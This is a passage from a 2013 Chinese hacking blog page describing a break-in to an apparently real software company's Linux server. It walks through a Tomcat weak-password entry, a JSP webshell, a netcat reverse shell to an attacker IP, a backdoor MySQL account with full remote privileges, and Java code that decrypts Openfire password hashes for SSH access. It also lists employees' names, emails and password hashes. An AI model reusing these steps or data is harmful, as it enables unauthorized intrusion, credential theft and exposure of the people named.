@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>渗透Linux服务器过程中，临时社工进行openfire解密 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-05-19T18:24:09.000Z" itemprop="datePublished">
+          2013-05-20
+      </time>
+    
+    
+    | 
+    <a href='/tag/Tomcat/'>Tomcat</a>
+    
+    
+</span>
+    <h1 class="post-title">渗透Linux服务器过程中，临时社工进行openfire解密</h1>
+    <section class="post-content">
+      <p>首先要有切入点，那就是<a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a>/manager/html的管理员页面弱口令。    <br>顺便科普一下，大家可以利用google hack来寻找tomcat页面    <br>在浏览器中输入：intitle:Apache.Tomcat &quot;Congratulations!&quot;&#160;&#160; <br>大概意思是：用点号来分割title关键词，用冒号来匹配页面内容</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0026.jpg" target="_blank" rel="external"><img title="clip_image002[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="394" alt="clip_image002[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0026_thumb.jpg" width="620" border="0"></a></p>  <p>当然如果/manager/html页面被删，或者管理员没有配置账号密码为可用，管理界面就不能访问。   <br>上传Deploy一个JSP大马:</p><br><a id="more"></a><br><p></p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0036.jpg" target="_blank" rel="external"><img title="clip_image003[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="264" alt="clip_image003[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0036_thumb.jpg" width="327" border="0"></a></p>  <p>Linux提权必备过程–利用webshell执行命令反弹：   <br>netcat源文件进行编译：</p>  <p>gcc xiaobo.c -o xiaobo</p>  <p>本地进行监听：</p>  <p>nc -vv -lp 12345</p>  <p>在JSP大马中进行反弹：</p>  <p>./xiaobo&#160; xx.xx.xx.xx 12345</p>  <p>注意：有时候会无法执行反弹，是因为文件没设置为可执行.那么就直接设置为全权限吧：</p>  <p>chmod 777 xiaobo</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0046.jpg" target="_blank" rel="external"><img title="clip_image004[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="124" alt="clip_image004[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0046_thumb.jpg" width="380" border="0"></a></p>  <p>我们先收集一下系统的信息：</p>  <p>lsb_release -a</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0066.jpg" target="_blank" rel="external"><img title="clip_image006[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="137" alt="clip_image006[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0066_thumb.jpg" width="620" border="0"></a></p>  <p>也就是说，我们要去找Ubuntu 12.04或者内核为3.2.0-38的exploit.   <br>一般都是去exploit-db.com这个网站上找。    <br>可惜很不幸的是，找了几个exploit都不行。    <br>当然我们也可以找驱动或者第三方服务进行提权，反正我是没成功过.    <br>继续收集服务器信息。用superscan扫描开放端口：</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0076.jpg" target="_blank" rel="external"><img title="clip_image007[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="229" alt="clip_image007[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0076_thumb.jpg" width="282" border="0"></a></p>  <p>用metasploit尝试了一下FTP和SSH的exploit和弱口令。无果   <br>用浏览器尝试了那几个高段位的端口，发现也有个tomcat（无弱口令），以及一个sea-file团队协作管理平台。    <br>google sea-file之后，发现是国人开发的一款开源的&quot;分布式文件同步技术&quot;的网盘。</p>  <p>仔细研究了一下该工具的安装配置，使用sqlite的嵌入数据库。上微博询问了开发团队该工具保存用户账号密码的文件位置:ccnet/peerMgr/usermgr.db。结果是文件夹ccnet无权限访问，但我还是找到一个存放账户名的seahub.db,打开看了一下：</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0086.jpg" target="_blank" rel="external"><img title="clip_image008[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="186" alt="clip_image008[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0086_thumb.jpg" width="220" border="0"></a></p>  <p>用上面的账号+弱口令+社工成功登陆：</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0096.jpg" target="_blank" rel="external"><img title="clip_image009[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="158" alt="clip_image009[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0096_thumb.jpg" width="380" border="0"></a></p>  <p>可以看到公司内部正在开发，或者已经完成的合同，项目计划，设计书等。可以知道这个服务器是某软件公司的。这些东西应该都是机密- -：</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0106.jpg" target="_blank" rel="external"><img title="clip_image010[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="261" alt="clip_image010[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0106_thumb.jpg" width="356" border="0"></a></p>  <p>先找找有没有漏洞上传什么的，看了一下开发语言： C/C++<a href="http://www.oschina.net/project/lang/25/python" target="_blank" rel="external">Pytho</a>n,吓尿了 - -。服务器也是自带的什么不认识的。所以放弃。权当收集信息用。    <br>可以看到公司的成员列表和管理员：</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0116.jpg" target="_blank" rel="external"><img title="clip_image011[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="509" alt="clip_image011[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0116_thumb.jpg" width="258" border="0"></a></p>  <p>继续社工：   <br>找tomcat下的工程，寻找保存的mysql密码。成功利用root密码，webshell登录mysql，(当然这里有个插曲就是我用的webshell无法连接mysql,或者不支持show databases,show tables等这些操作，所以自己重新改了源码）    <table cellspacing="0" cellpadding="0" border="1"><tbody>       <tr>         <td>           <p>数据库连接失败</p>         </td>       </tr>        <tr>         <td>           <p>com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException:&#160; Cannot load connection class because of underlying exception:&#160; ‘java.lang.NumberFormatException: For input string:&#160; &quot;3306;User=root;Password=testxx;DatabaseName=mysql&quot;’.</p>         </td>       </tr>     </tbody></table> </p>  <p>为了方便查看数据，就直接开启外链。这里再顺便科普一下：   <br>为了保护服务器，我就不使用root外链。免得被不明黑阔批量扫描弱口令爆菊.</p>  <p>创建一个允许远程连接的用户hack,密码hack,赋予所有权限</p>  <p>CREATE USER hack IDENTIFIED BY ‘hack’;</p>  <p>grant all privileges on <em>.</em> to hack @&quot;%&quot; identified by &quot;hack&quot;;</p>  <p>之后就用mysql workbench连接（开发人员专用哟~嘿嘿）   <br>插曲：据说linux下的mysql可以利用system命令提权。我windows 命令行下远程连接mysql,尝试system user add命令失败。去mysql官方，查看官方文档，确实有system函数.BT5命令行下远程连接mysql，system user add成功，囧的是用户居然添加在我BT5上面。同学们都该知道mysql system函数的意思了吧？    <br>回归正题：我现在要收集mysql数据库存的所有用户账号和密码，进一步来社工linux root密码进行远程ftp或者ssh操作。    <br>解密了一些md5,基本都是弱口令。    <br>亮点来了：openfire数据库。    <br>看着名字我就觉得有点来头，谷歌之后得到：Openfire 是实时的基于WEB的即时消息传输平台，是原来的Jive Messenger    <table cellspacing="0" cellpadding="0" border="1"><tbody>       <tr>         <td>           <p>admin</p>         </td>          <td>           <p>de8d41e122591e3ac5dfabf41bb8ee186cb0ec963347ae71</p>         </td>          <td>           <p>Administrator</p>         </td>          <td>           <p>admin@family10.com</p>         </td>       </tr>        <tr>         <td>           <p>caifei</p>         </td>          <td>           <p>0db546455b7e6a8bd1905e34028ca31704ae5cf27a65e1c2</p>         </td>          <td>           <p>蔡飞</p>         </td>          <td>           <p>caifei@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>chensong</p>         </td>          <td>           <p>e54b7b46c4862dd1ea159a174eb1e26d6b6c1fac89a5dc73</p>         </td>          <td>           <p>陈松</p>         </td>          <td>           <p>chensong@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>liqiang</p>         </td>          <td>           <p>4f21a0de9b6a32aadd0a6bd0cf53a82da6504bc85111556e</p>         </td>          <td>           <p>李强</p>         </td>          <td>           <p>liqiang4264@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>liqing</p>         </td>          <td>           <p>0d24c065be1fdd4db3dde16d39b8907f8248a8a4a7f84c75</p>         </td>          <td>           <p>李青</p>         </td>          <td>           <p>liqing@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>liuhuayi</p>         </td>          <td>           <p>5809dadd4631e859d995d93ff0587524f75c541ab55f23c6</p>         </td>          <td>           <p>刘华宜</p>         </td>          <td>           <p>liuhuayi@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>qiulibo</p>         </td>          <td>           <p>8c14fda295def40ba10bcd9b78ee869ce5a9880eaa8c6eb6</p>         </td>          <td>           <p>邱李波</p>         </td>          <td>           <p>qiubibo@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>xuliang</p>         </td>          <td>           <p>ba8dc396077d18e3a5683455a92d808adb06d8ac74f31fa3</p>         </td>          <td>           <p>徐亮</p>         </td>          <td>           <p>xuliang@qq.com</p>         </td>       </tr>        <tr>         <td>           <p>zhangxin</p>         </td>          <td>           <p>b88349048d4b55b91f9a942652b89cf36d75cc2e8ba2cfd6</p>         </td>          <td>           <p>张欣</p>         </td>          <td>           <p><a href="mailto:zhangxin@qq.com" target="_blank" rel="external">zhangxin@qq.com</a></p>         </td>       </tr>     </tbody></table> </p>  <p>拿去cmd5上解密，无法识别加密类型。于是呼，本文的重点，openfire解密.   <br>openfire也是开源的软件，密码采用的是自己设计的算法。    <br>openfire提供二次开发。谷歌之后发现资料蛮多了。所以，我们就来搭个二次开发环境，利用openfire提供的解密类进行解密吧~</p>  <p>Openfire是通过org.jivesoftware.util.Blowfish.java实现的加密。</p>  <p>使用Blowfish的encryptString(String password)和decryptString(String encryptedString)两个方法执行加解密。</p>  <p>可new Blowfish(String passwordKey)需要passwordKey，上哪里找？</p>  <p>原来在openfire的数据库中有表ofproperty，其中就有passwordKey的值，这是openfire安装时自动生成的。</p>  <p>&#160;&#160;&#160;&#160;&#160; openfire每次自动生成数据库的时候这个属性都是不同的，所以如果数据库变化了，原来的用户信息导入是没有用的。</p>  <p>可以独立使用org.jivesoftware.util.Blowfish.java进行加解密操作。</p>  <p>在eclipse中新建java工程，在官网上找到org.jivesoftware.util.Blowfish.java类，导入工程。   <br>再写个DecryPwd用来解密。</p>  <p>public class DecryPwd {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; /<em>*</em></p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  @param args</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; */</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; public static void main(String[] args) {</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; // TODO Auto-generated method stub</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; String resultPWD = null;&#160; </p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; String passWordKey = &quot;566251afC9Lk39w&quot;; //passwordKey,从openfire数据库中读取</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; Blowfish blowFish = new Blowfish(passWordKey); //根据加密key初始化</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; resultPWD = blowFish.decryptString(&quot;de8d41e122591e3ac5dfabf41bb8ee186cb0ec963347ae71&quot;);&#160;&#160; </p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; System.out.println(resultPWD);&#160; //返回结果</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</p>  <p>}</p>  <p>运行成功解密！   <br>接着就拿着账号密码去ssh啦。过程就到此。</p>  <p><a href="http://img.cker.in/Linuxopenfire_91A9/clip_image0126.jpg" target="_blank" rel="external"><img title="clip_image012[6]" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="132" alt="clip_image012[6]" src="http://img.cker.in/Linuxopenfire_91A9/clip_image0126_thumb.jpg" width="273" border="0"></a></p>  <p>转自<a href="http://bbs.blackbap.org/" target="_blank">习科论坛</a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/997.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/997.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/997.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/997.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/998.seo/">
+        ← Windows下Apache用户认证配置及相关技巧
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/996.seo/">
+        情色网站启示：请尊重你不懂的领域 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
